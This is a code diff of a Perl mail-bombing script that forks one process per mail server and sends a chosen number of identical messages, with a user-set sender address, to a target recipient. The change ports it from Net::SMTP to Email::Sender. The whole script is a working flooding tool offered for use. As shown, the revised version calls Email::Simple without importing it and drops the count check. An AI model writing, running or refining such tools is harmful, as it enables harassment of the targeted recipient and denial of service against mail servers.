@@ -1,13 +1,15 @@
-#!/usr/bin/perl
+#!/usr/bin/env perl
 
 
 ### INCLUDES
 use strict;
+use warnings;
 use Getopt::Long;
 use IO::Socket::INET;
 use Net::SMTP;
-use feature 'say';
 use POSIX qw/WNOHANG/;
+use Email::Sender::Simple qw/try_to_sendmail/;
+use Email::Sender::Transport::SMTP;
 
 
 ### GLOBALS
@@ -26,50 +28,63 @@ main;
 
 ### SUBROUTINE DEFINITIONS
 sub main {
-  GetOptions ("to=s" => \$to, "from=s" => \$from, "count=i" => \$count, "subject=s" => \$subject);
-  usage and exit unless $to and $from and $subject and $count > 0 and @ARGV > 0;
+  GetOptions (
+    "to=s"      => \$to,
+    "from=s"    => \$from,
+    "count=i"   => \$count,
+    "subject=s" => \$subject
+  );
 
+  usage if !defined $to;
+  usage if !defined $from;
+  usage if !defined $subject;
+
+  # Should automatically reap zombies.
   $SIG{CHLD} = 'IGNORE';
 
-  my %kids;
-  for my $gateway (@ARGV) {
+  for my $mailhost (@ARGV) {
+    print "mail bombing $mailhost ($count emails)\n";
+
     my $pid = fork;
     $pid < 0 and die "fork failed: $!";
-    if ($pid == 0) {  # child
-      say "mail bombing $gateway ($count emails)";
-      mbomb $gateway;
+
+    if ($pid == 0) {  # Child
+      mbomb $mailhost;
       exit 0;
     }
-    $kids{$pid};  # parent
   }
 
-  while (keys %kids) {
-    if (my $kid = waitpid(-1, WNOHANG) > 0) {
-      delete $kids{$kid};
-    }
-  }
-
-  exit;
+  exit 0;
 }
 
 
 sub mbomb {
-  my $gateway = shift;
-
+  my $mailhost = shift;
   my $counter = $count;
+  my $transport = Email::Sender::Transport::SMTP->new({
+    host => $mailhost,
+  });
+
   while ($counter-- > 0) {
-    my $smtp = Net::SMTP->new($gateway) or next;
-    $smtp->mail($from) or next;
-    $smtp->recipient($to, { Notify => ['NEVER'], SkipBad => 1 }) or next;
-    $smtp->data("Subject: $subject\n\n$subject\n") or next;
-    $smtp->quit or next;
+    my $email = Email::Simple->create(
+      header => [
+          To      => $to,
+          From    => $from,
+          Subject => $subject,
+      ],
+      body   => $subject,
+    );
+  
+    try_to_sendmail($email, { transport => $transport })
+       or warn "try_to_sendmail failed: $!";
   }
 
-  return 1;
+  return;
 }
     
 
 sub usage {
-  say "usage: $0 --to=<recipient address> --from=<sender address> --count=<number of emails> --subject=<subject line> gateway ...";
-  say "usage: $0 -t <recipient address> -f <sender address> -c <number of emails> -s <subject line> gateway ...";
+  print "usage: $0 --to=<recipient address> --from=<sender address> --count=<number of emails> --subject=<subject line> mailhost ...\n";
+  print "usage: $0 -t <recipient address> -f <sender address> -c <number of emails> -s <subject line> mailhost ...\n";
+  exit 1;
 }
